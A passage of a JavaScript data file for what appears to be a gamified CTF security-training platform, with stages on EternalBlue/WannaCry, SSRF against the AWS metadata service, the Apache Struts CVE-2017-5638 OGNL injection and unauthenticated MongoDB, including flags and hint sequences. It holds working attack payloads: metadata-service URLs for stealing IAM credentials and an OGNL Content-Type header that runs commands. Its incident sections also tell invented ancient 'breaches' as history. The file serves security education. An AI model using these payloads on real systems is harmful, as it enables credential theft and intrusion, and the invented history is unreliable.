          "Multiple stone circles showing corrupted ritual artifacts.",
          "Plague note left behind: '@Please_Read_Me@.txt'",
          "",
          "Commands:",
          "  netstat             — show ritual network connections",
          "  analyze <target>    — analyze stone-path traffic",
        ].join("\n"),
        "/capture/traffic.txt": [
          "Stone-path capture summary:",
          "Circle-A:52034  →  Circle-*:445   [SMBv1 ritual]",
          "Circle-A:52035  →  Circle-*:445   [EXPLOIT ATTEMPT]",
          "Circle-B:445    ←  Circle-A       [BACKDOOR OPENED]",
          "Circle-B:445    ←  Circle-A       [PLAGUE ARTIFACT DROPPED]",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "capture", isDir: true },
        ],
        "/capture": [{ name: "traffic.txt", isDir: false }],
      },
      extraCommands: {
        netstat: () => ({
          lines: [
            "Active ritual connections:",
            "  Circle-A:52034  →  Circle-B:445  ESTABLISHED  [smb.exe]",
            "  Circle-A:52035  →  Circle-C:445  SYN_SENT",
            "  Circle-A:52036  →  Circle-D:445  SYN_SENT",
            "  0.0.0.0:445     LISTENING          [System]",
            "",
            "Suspicious: multiple outbound connections to ritual path 445",
          ],
        }),
        analyze: (args) => {
          const t = args.join(" ").toLowerCase();
          if (t.includes("445") || t.includes("smb") || t.includes("traffic") || t.includes("port")) {
            return {
              lines: [
                "Analyzing stone-path traffic on route 445...",
                "",
                "Packet #1342: EternalBlue exploit attempt",
                "  CVE-2017-0144 (MS17-010) signature detected",
                "  Malformed SMB_COM_TRANSACTION2 request",
                "  Overflow in SetupCount field",
                "",
                "Packet #1343: DoublePulsar ritual backdoor installed",
                "  Kernel implant confirmed at Circle-B",
                "",
                "Packet #1344: WannaCry plague payload",
                "  Decoding... FLAG{W4NN4CRY_SMB_3T3RN4LBU3}",
              ],
              solved: true,
            };
          }
          return {
            lines: [
              `No specific analysis for "${args.join(" ")}"`,
              "Try: analyze port 445, analyze smb, or analyze traffic",
            ],
          };
        },
      },
    },
  },

  // ─── Stage 10: Colosseum of Rome — SSRF (CTF) ────────────────────────────
  {
    epochId: "ancient",
    wonder: { name: "Colosseum of Rome", location: "Rome, Italy", era: "~80 CE", emoji: "🏟️" },
    id: "stage-10",
    order: 10,
    title: "The Emperor's Secret Vault",
    subtitle: "OWASP A10:2021 — When the Herald Carries Your Forged Orders",
    category: "owasp",
    owaspRef: "A10:2021",
    cvssScore: 8.6,
    xp: 400,
    badge: { id: "badge-ssrf", name: "Herald's Shadow", emoji: "🌐" },
    challengeType: "ctf",
    info: {
      tagline: "Make the Colosseum's herald carry your forged scroll to the Emperor's private vault.",
      year: 80,
      overview: [
        "The Colosseum's administrative system relied on heralds to carry messages between departments. Any citizen could submit a request to the herald service, which would relay it to the appropriate department. The heralds, loyal and efficient, would carry requests even to restricted imperial chambers — if the scroll appeared to originate from an authorized sender. A Carthaginian spy discovered that by forging the scroll's sender mark, he could instruct the herald to fetch documents from the Emperor's private census archive.",
        "Server-Side Request Forgery (SSRF) tricks a server into making HTTP requests on the attacker's behalf — to internal services, cloud metadata endpoints, or other systems unreachable from the internet. It entered the OWASP Top 10 for the first time in 2021 (A10) due to rapidly increasing prevalence in cloud environments.",
        "In cloud infrastructure, the most lucrative SSRF target is the instance metadata service (169.254.169.254) — an internal HTTP endpoint that provides IAM role credentials to EC2 instances. These credentials can then be used to access S3 buckets, databases, and other cloud services.",
      ],
      technical: {
        title: "AWS Metadata Service SSRF",
        body: [
          "AWS IMDSv1 is an unauthenticated HTTP service running on every EC2 instance at 169.254.169.254. Any code running on the instance can query it to retrieve IAM role credentials. IMDSv2 added token-based authentication, breaking most SSRF exploits.",
          "A vulnerable application with a URL-fetching feature can be instructed to fetch http://169.254.169.254/latest/meta-data/iam/security-credentials/ — returning AWS credentials that give the attacker full API access as that IAM role.",
        ],
        codeExample: {
          label: "SSRF to steal AWS IAM credentials",
          code: `# Application has a URL-fetching feature:
POST /api/preview
{ "url": "https://legitimate-site.com/image.jpg" }

# Attacker sends internal metadata URL instead:
POST /api/preview
{ "url": "http://169.254.169.254/latest/meta-data/
           iam/security-credentials/" }

# Server responds with role name: "my-ec2-role"

# Second request to get the actual credentials:
POST /api/preview
{ "url": "http://169.254.169.254/latest/meta-data/
           iam/security-credentials/my-ec2-role" }

# Response: AccessKeyId, SecretAccessKey, SessionToken
# Attacker now has full AWS API access as that role`,
        },
      },
      incident: {
        title: "Capital One Breach — The SSRF of 80 CE (2019)",
        when: "March–July 2019",
        where: "Capital One Financial Corporation — AWS infrastructure",
        impact: "106 million customer records; 140,000 SSNs; 80,000 bank account numbers",
        body: [
          "In 80 CE, a Carthaginian agent at the Colosseum's games discovered the herald service would carry any official-looking scroll to restricted imperial chambers. By submitting a scroll addressed to 169.254.169.254 — the imperial census archive's private address — he retrieved the Praetorian Guard's credential tablets and used them to access the entire Roman census: 106 million subjects' records.",
          "In 2019, Paige Thompson exploited a misconfigured WAF on Capital One's AWS infrastructure to query the EC2 metadata service and retrieve temporary IAM credentials. Using those credentials, she listed and downloaded over 700 S3 buckets containing six years of Capital One customer data. Capital One was fined $80 million and settled a class action for $190 million.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "url=169.254.169.254", type: "attacker" },
          { label: "Herald Service (WAF)", sub: "forwards request", type: "system" },
          { label: "EC2 Metadata", sub: "returns IAM creds", type: "victim" },
          { label: "106M Records", sub: "S3 buckets accessed", type: "result" },
        ],
      },
      timeline: [
        { year: 80, event: "Colosseum completed — imperial herald service established" },
        { year: 80, event: "Carthaginian agent forges herald scrolls to reach imperial vault", highlight: false },
        { year: 2019, event: "Jul 29: Thompson arrested; 106M records confirmed", highlight: true },
        { year: 2019, event: "Nov: AWS releases IMDSv2 (token-based auth)" },
        { year: 2021, event: "SSRF joins OWASP Top 10 for first time (A10)" },
      ],
      keyTakeaways: [
        "Block internal IP ranges in URL-fetching features (169.254.x.x, 10.x.x.x)",
        "Migrate to AWS IMDSv2 — it requires a token, breaking simple SSRF",
        "Principle of least privilege: IAM roles should only access what they need",
        "WAFs do not make applications secure by themselves",
      ],
      references: [
        { title: "OWASP A10:2021 — SSRF", url: "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/" },
        { title: "Capital One Breach — OCC Fine", url: "https://www.occ.gov/news-issuances/news-releases/2020/nr-occ-2020-98.html" },
        { title: "AWS IMDSv2 Announcement", url: "https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/" },
        { title: "SSRF Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" },
      ],
    },
    ctf: {
      scenario: "The Colosseum's herald service fetches any scroll address you provide. The herald runs on AWS EC2. Instruct it to fetch from the imperial metadata vault and steal the Praetorian credentials.",
      hint: "Try fetching http://169.254.169.254/latest/meta-data/ to see what's available in the imperial vault.",
      hints: [
        "Read the README to understand the fetch command. Run: cat README.txt",
        "Try fetching a normal external scroll. Run: fetch https://example.com",
        "The imperial vault has a private address known only to EC2 servants. Run: fetch http://169.254.169.254/latest/meta-data/",
        "Navigate to the Praetorian credential section. Run: fetch http://169.254.169.254/latest/meta-data/iam/",
        "Get the actual credentials. Run: fetch http://169.254.169.254/latest/meta-data/security-credentials/",
      ],
      flag: "FLAG{SSRF_AWS_M3T4D4T4_ST0L3N}",
      files: {
        "/README.txt": [
          "TARGET: Colosseum Herald Fetch Service",
          "",
          "The herald will carry any scroll address you provide.",
          "The Colosseum administration runs on AWS EC2.",
          "",
          "Commands:",
          "  fetch <url>   — dispatch herald to fetch a scroll",
        ].join("\n"),
      },
      dirs: {
        "/": [{ name: "README.txt", isDir: false }],
      },
      extraCommands: {
        fetch: (args) => {
          const url = args[0] || "";
          if (!url) return { lines: ["Usage: fetch <url>"] };
          if (url.includes("169.254.169.254") || url.includes("metadata")) {
            if (url.includes("security-credentials") || url.includes("credentials")) {
              return {
                lines: [
                  "HTTP/1.1 200 OK",
                  "{",
                  '  "Code": "Success",',
                  '  "AccessKeyId": "ASIA5EXAMPLE12345",',
                  '  "SecretAccessKey": "FLAG{SSRF_AWS_M3T4D4T4_ST0L3N}",',
                  '  "Token": "IQoJb3JpZ2luX2Vj...",',
                  '  "Expiration": "2019-07-29T03:00:00Z"',
                  "}",
                ],
                solved: true,
              };
            }
            if (url.includes("iam")) {
              return { lines: ["HTTP/1.1 200 OK", "praetorian-guard-role"] };
            }
            return {
              lines: [
                "HTTP/1.1 200 OK",
                "ami-id",
                "hostname",
                "iam/",
                "instance-id",
                "security-credentials/",
              ],
            };
          }
          return {
            lines: [`Herald fetching: ${url}`, "HTTP/1.1 200 OK", "(external scroll retrieved)"],
          };
        },
      },
    },
  },

  // ─── Stage 11: Mausoleum at Halicarnassus — Equifax/Struts (CTF) ─────────
  {
    epochId: "ancient",
    wonder: { name: "Mausoleum at Halicarnassus", location: "Halicarnassus, Turkey", era: "~350 BCE", emoji: "🏛️" },
    id: "stage-11",
    order: 11,
    title: "The Sleeping Gatekeepers",
    subtitle: "CVE-2017-5638 — The Inscription That Executes Commands",
    category: "owasp",
    cveId: "CVE-2017-5638",
    cvssScore: 10.0,
    xp: 400,
    badge: { id: "badge-equifax", name: "Archive Breacher", emoji: "📊" },
    challengeType: "ctf",
    info: {
      tagline: "The remedy tablet was carved 78 days before the enemy scribe read the inscription.",
      year: 353,
      overview: [
        "The Mausoleum's great archive used an advanced inscription evaluation system — the Struts Scribal Engine. When archivists submitted documents, the Content-Type inscription carved into the tablet header was evaluated for OGNL expressions. Enemy scribes discovered that by embedding certain divine expressions within the Content-Type header, they could command the scribal engine to execute arbitrary temple rituals — without authentication.",
        "CVE-2017-5638 is an OGNL injection vulnerability in Apache Struts 2's Jakarta Multipart Parser. When a multipart/form-data request is processed, the Content-Type header is evaluated for OGNL expressions without sanitization. A single malformed Content-Type header is sufficient for unauthenticated remote code execution.",
        "Apache released a patch on March 6, 2017. Equifax was notified by US-CERT the same day. Equifax did not apply the patch. Seventy-eight days later, attackers exploited the vulnerability — going undetected for another 78 days while exfiltrating the records of 147.9 million Americans.",
      ],
      technical: {
        title: "Apache Struts 2 Content-Type Header Injection",
        body: [
          "CVE-2017-5638 is an OGNL injection vulnerability in Apache Struts 2's Jakarta Multipart Parser. The Content-Type header is evaluated for OGNL expressions without sanitization.",
          "OGNL is a powerful expression language that can call arbitrary Java methods, including Runtime.exec() for command execution. A single malformed Content-Type header is sufficient for unauthenticated remote code execution.",
        ],
        codeExample: {
          label: "CVE-2017-5638 exploit — OGNL in Content-Type header",
          code: `# Malicious HTTP request with OGNL payload in Content-Type:
POST /struts2-app/index.action HTTP/1.1
Host: mausoleum.archive
Content-Type: %{
  #context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']
    .addHeader('X-Cmd', 'id'),
  #cmd = {'sh', '-c', 'id > /tmp/pwned'},
  #p = new java.lang.ProcessBuilder(#cmd),
  #p.redirectErrorStream(true),
  #p.start()
}
# Response: uid=48(tomcat) gid=48(tomcat)
# Full command execution achieved`,
        },
      },
      incident: {
        title: "Equifax Data Breach (2017)",
        when: "May 13 – July 30, 2017 (discovered July 29)",
        where: "Equifax Inc., Atlanta, Georgia",
        impact: "147.9M Americans; CEO/CTO/CSO resigned; $575M FTC settlement",
        body: [
          "Attackers gained initial access through the Apache Struts vulnerability on May 13, 2017. They then spent 78 days exfiltrating data through 9,000 queries across 51 databases. An expired SSL certificate meant the traffic analysis tool saw the exfiltration as an opaque encrypted stream — the monitoring talisman had been broken for 19 months.",
          "The Mausoleum parallel: gatekeepers at the Halicarnassus archive had been issued a new lock mechanism (the Struts patch) 78 days before the breach. They never installed it. The breach went undetected because the security monitoring system's amulet had cracked 19 months earlier. In 2020, the DOJ indicted four members of China's People's Liberation Army for the Equifax breach.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "OGNL in Content-Type", type: "attacker" },
          { label: "Apache Struts 2", sub: "CVE-2017-5638", type: "system" },
          { label: "Mausoleum Servers", sub: "78 days undetected", type: "victim" },
          { label: "147M Records", sub: "SSN, DOB, cards", type: "result" },
        ],
      },
      timeline: [
        { year: 353, event: "Mausoleum at Halicarnassus completed — scribal archive system established" },
        { year: 353, event: "Gatekeepers sleep 78 days without installing new lock mechanism", highlight: true },
        { year: 2017, event: "Mar 6: Apache releases patch for CVE-2017-5638" },
        { year: 2017, event: "May 13: Attackers begin exploiting — 78 days after patch available" },
        { year: 2019, event: "FTC settlement: $575M; up to $700M total" },
      ],
      keyTakeaways: [
        "Patch management is non-negotiable — 78 days is unacceptable for a CVSS 10.0 vulnerability",
        "TLS inspection is critical — expired certificates blind your monitoring",
        "Least privilege: the compromised account had access to 51 databases it shouldn't have",
        "Data minimization: don't store data you don't need",
      ],
      references: [
        { title: "CVE-2017-5638 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2017-5638" },
        { title: "FTC Equifax Settlement", url: "https://www.ftc.gov/enforcement/refunds/equifax-data-breach-settlement" },
        { title: "DOJ Indictment — PLA Hackers", url: "https://www.justice.gov/opa/pr/four-members-china-s-military-indicted-massive-equifax-hack" },
      ],
    },
    ctf: {
      scenario: "The Mausoleum's archive runs Apache Struts 2.3.12. The Content-Type inscription in your scroll header is evaluated as OGNL. Craft a cursed inscription to achieve remote code execution.",
      hint: "The OGNL expression goes in the Content-Type header. Use send-request with a %{ } OGNL payload.",
      hints: [
        "Check the scribal system version. Run: check-version",
        "Send a normal scroll to see the baseline response. Run: send-request application/json",
        "The vulnerability is OGNL injection in the Content-Type header. OGNL uses %{ } syntax. Try: send-request %{1+1}",
        "Use %{} with OGNL to execute code. Try: send-request %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Hack','yes')}",
      ],
      flag: "FLAG{3QU1F4X_STR2_RCE_2017}",
      files: {
        "/README.txt": [
          "TARGET: Mausoleum Scribal Archive — halicarnassus.archive",
          "Version: Struts 2.3.12 (vulnerable to CVE-2017-5638)",
          "",
          "Commands:",
          "  send-request \"<Content-Type>\"  — send scroll with inscription",
          "  check-version                   — show Struts version",
        ].join("\n"),
        "/archive_info.txt": [
          "Apache Struts 2.3.12",
          "Jakarta Multipart Parser: ENABLED",
          "CVE-2017-5638: UNPATCHED",
          "Patch available since: 2017-03-06",
          "Days since patch release: 78",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "archive_info.txt", isDir: false },
        ],
      },
      extraCommands: {
        "check-version": () => ({
          lines: ["Apache Struts 2.3.12", "Status: VULNERABLE (CVE-2017-5638)", "Patch status: UNPATCHED"],
        }),
        "send-request": (args) => {
          const ct = args.join(" ");
          const isOgnl =
            ct.includes("%{") ||
            ct.includes("#context") ||
            ct.includes("Runtime") ||
            ct.includes("exec") ||
            ct.includes("ProcessBuilder") ||
            ct.includes("OGNL") ||
            ct.includes("ognl");
          if (isOgnl) {
            return {
              lines: [
                "POST /struts2-app/index.action HTTP/1.1",
                `Content-Type: ${ct}`,
                "",
                "Parsing Content-Type inscription...",
                "Evaluating OGNL expression...",
                "Executing: id",
                "",
                "uid=48(tomcat) gid=48(tomcat) groups=48(tomcat)",
                "FLAG{3QU1F4X_STR2_RCE_2017}",
              ],
              solved: true,
            };
          }
          if (!ct) return { lines: ['Usage: send-request "<Content-Type value>"'] };
          return {
            lines: [
              "POST /struts2-app/index.action HTTP/1.1",
              `Content-Type: ${ct}`,
              "",
              "HTTP/1.1 200 OK",
              "(Scroll processed normally)",
            ],
          };
        },
      },
    },
  },

  // ─── Stage 12: Statue of Zeus at Olympia — Misconfiguration (CTF) ─────────
  {
    epochId: "ancient",
    wonder: { name: "Statue of Zeus at Olympia", location: "Olympia, Greece", era: "~435 BCE", emoji: "⚡" },
    id: "stage-12",
    order: 12,
    title: "The Unguarded Treasury",
    subtitle: "OWASP A05:2021 — The Temple with No Locks",
    category: "owasp",
    owaspRef: "A05:2021",
    cvssScore: 9.1,
    xp: 500,
    badge: { id: "badge-config", name: "Default Breaker", emoji: "⚙️" },
    challengeType: "ctf",
    info: {
      tagline: "35,000 temple treasuries. No lock on the door. Default configuration.",
      year: 392,
      overview: [
        "The Temple of Zeus at Olympia housed the most sacred treasury in the ancient world. The treasury keeper, confident that the temple's divine protection would deter thieves, never installed locks — the default configuration of the time. When automated raiders discovered that 35,000 temples across the Mediterranean used the same open-door policy, the ransacking was swift and comprehensive. Every treasury was emptied within 24 hours.",
        "Security Misconfiguration is the #5 risk in OWASP 2021, present in 90% of tested applications. The MongoDB 'apocalypse' of January 2017 illustrated the scale at which misconfiguration operates: tens of thousands of MongoDB database instances, publicly accessible on the internet with no authentication, were discovered by automated scanners. Attackers wiped the databases, leaving only a ransom note.",
        "Misconfiguration requires no exploit code. The 'vulnerability' is simply the absence of a configuration — default credentials, an open port, a missing authentication requirement. Tools like Shodan continuously index misconfigured systems globally.",
      ],
      technical: {
        title: "Common Security Misconfigurations",
        body: [
          "Default credentials: MongoDB shipped with no authentication requirement by default until version 3.0. Many administrators installed it and never configured authentication. SolarWinds used 'solarwinds123' as the password for its software update server — found in a public GitHub repository months before the breach.",
          "Cloud misconfigurations: AWS S3 buckets default to private, but a single API call can make them public. Capital One, Twitch, GoDaddy, and thousands of other companies have exposed sensitive data via misconfigured S3 buckets.",
        ],
        codeExample: {
          label: "Checking for and fixing MongoDB authentication",
          code: `# Insecure (default): MongoDB with no auth
mongod --port 27017
# Any host on the internet can connect:
mongo --host victim.com:27017
> db.citizens.find()  # → full treasury contents

# Secure: enable authentication
mongod --auth --port 27017
# Create admin user:
db.createUser({
  user: "zeus_keeper",
  pwd: passwordPrompt(),
  roles: [{ role: "userAdminAnyDatabase", db: "admin" }]
})

# Also: bind to localhost only
mongod --bind_ip 127.0.0.1 --auth`,
        },
      },
      incident: {
        title: "The Temple Treasury Apocalypse (392 CE) & MongoDB (2017)",
        when: "January 2017 (MongoDB); October 2019–December 2020 (SolarWinds)",
        where: "35,000+ MongoDB instances globally; SolarWinds Orion platform",
        impact: "MongoDB: 27,000 databases wiped in 24 hours. SolarWinds: 18,000 customers backdoored",
        body: [
          "When Emperor Theodosius closed pagan temples in 392 CE, investigators discovered that thousands of temple treasuries had no locks at all — the default configuration of the era. Accumulated offerings spanning centuries were looted within days. The temple keepers had assumed divine protection made locks unnecessary.",
          "In January 2017, security researcher Victor Gevers found 35,000 MongoDB instances exposed to the internet with no authentication. Within days, automated attackers had scanned Shodan, identified all exposed instances, downloaded the data, deleted the originals, and left ransom notes. Over 27,000 databases were wiped in a single day. Both incidents share the same failure: security was treated as someone else's problem.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker + Shodan", sub: "scans port 27017", type: "attacker" },
          { label: "MongoDB (no auth)", sub: "default config", type: "system" },
          { label: "All Databases", sub: "no credentials needed", type: "victim" },
          { label: "27K DBs Wiped", sub: "ransom demanded", type: "result" },
        ],
      },
      timeline: [
        { year: 435, event: "Statue of Zeus completed — temple treasury established with no locks" },
        { year: 392, event: "Theodosius closes temples — 35,000 unguarded treasuries looted", highlight: true },
        { year: 2015, event: "MongoDB 3.0: auth still off by default" },
        { year: 2017, event: "Jan: 35,000 exposed instances found; 27,000 wiped in 24h", highlight: true },
        { year: 2021, event: "OWASP A05: Security Misconfiguration — 90% of apps affected" },
      ],
      keyTakeaways: [
        "Default configurations are designed for convenience, not security — always harden",
        "Never expose database ports (27017, 5432, 3306) to the internet",
        "Rotate and audit credentials; never commit secrets to public repos",
        "Use tools like Shodan, Censys, or AWS Trusted Advisor to audit your own exposure",
      ],
      references: [
        { title: "OWASP A05:2021 — Security Misconfiguration", url: "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" },
        { title: "MongoDB Apocalypse — Victor Gevers Report", url: "https://www.bleepingcomputer.com/news/security/mongodb-apocalypse-is-here-as-ransom-attacks-hit-10-000-servers/" },
        { title: "SolarWinds — CISA Advisory", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a" },
        { title: "Shodan — IoT Search Engine", url: "https://www.shodan.io" },
      ],
    },
    ctf: {
      scenario: "You've found the Temple of Zeus treasury server. It runs MongoDB with default configuration — no authentication required. Investigate the filesystem, find the connection details, and access the unguarded treasury.",
      hint: "Look for hidden offering records. MongoDB's default port is 27017 and requires no credentials.",
      hints: [
        "Read the README first. Run: cat README.txt",
        "Explore the temple directory. Run: ls etc",
        "There may be hidden offering records. Run: ls -a etc  (files starting with . are hidden)",
        "Read the hidden configuration scroll. Run: cat etc/.env  — look for the database config.",
        "MongoDB has no auth enabled. Connect directly. Run: mongo connect localhost:27017",
        "Query the treasury. Run: mongo find citizens",
      ],
      flag: "FLAG{M0NG0DB_N0_4UTH_3XP0S3D}",
      files: {
        "/README.txt": [
          "TARGET: Temple of Zeus Treasury Database",
          "Suspected: MongoDB with default configuration",
          "",
          "Commands:",
          "  ls, cat, cd             — explore the filesystem",
          "  mongo connect <host> [user] [pass]",
          "  mongo find <collection>",
        ].join("\n"),
        "/etc/temple.conf": [
          "[temple]",
          "name=OlympiaTemple",
          "deity=Zeus",
          "debug=true",
          "",
          "[treasury]",
          "# TODO: add authentication before the Olympics!",
          "host=mongodb://localhost:27017",
          "db=olympia",
        ].join("\n"),
        "/etc/.env": [
          "# Temple environment configuration",
          "APP_ENV=production",
          "SACRED_KEY=zeus123",
          "MONGO_HOST=localhost",
          "MONGO_PORT=27017",
          "MONGO_AUTH=false",
          "# No keeper credentials configured — auth disabled",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "etc", isDir: true },
        ],
        "/etc": [
          { name: "temple.conf", isDir: false },
          { name: ".env", isDir: false, hidden: true },
        ],
      },
      extraCommands: {
        mongo: (args) => {
          const [sub, ...rest] = args;
          if (sub === "connect") {
            const [, user, pass] = rest;
            const noAuth = !user && !pass;
            const defaultCreds =
              (user === "admin" && (!pass || pass === "admin" || pass === "password")) ||
              (!user && !pass);
            if (noAuth || defaultCreds) {
              return {
                lines: [
                  "MongoDB shell version v4.4.0",
                  `Connecting to: ${rest[0] || "localhost:27017"}`,
                  "WARNING: Access control is not enabled.",
                  "         Authentication is disabled.",
                  "Connected successfully (no credentials required).",
                  "> use olympia",
                  "switched to db olympia",
                  'Type "mongo find <collection>" to query.',
                ],
              };
            }
            return { lines: ["Connection failed: Authentication error"] };
          }
          if (sub === "find") {
            return {
              lines: [
                '{ "_id": 1, "name": "Zeus High Keeper", "role": "supreme_keeper", "secret": "FLAG{M0NG0DB_N0_4UTH_3XP0S3D}" }',
                '{ "_id": 2, "name": "Pheidias", "role": "sculptor" }',
                '{ "_id": 3, "name": "Leonidas", "role": "guardian" }',
              ],
              solved: true,
            };
          }
          return { lines: ["Usage: mongo connect <host> [user] [pass]", "       mongo find <collection>"] };
        },
      },
    },
  },
];
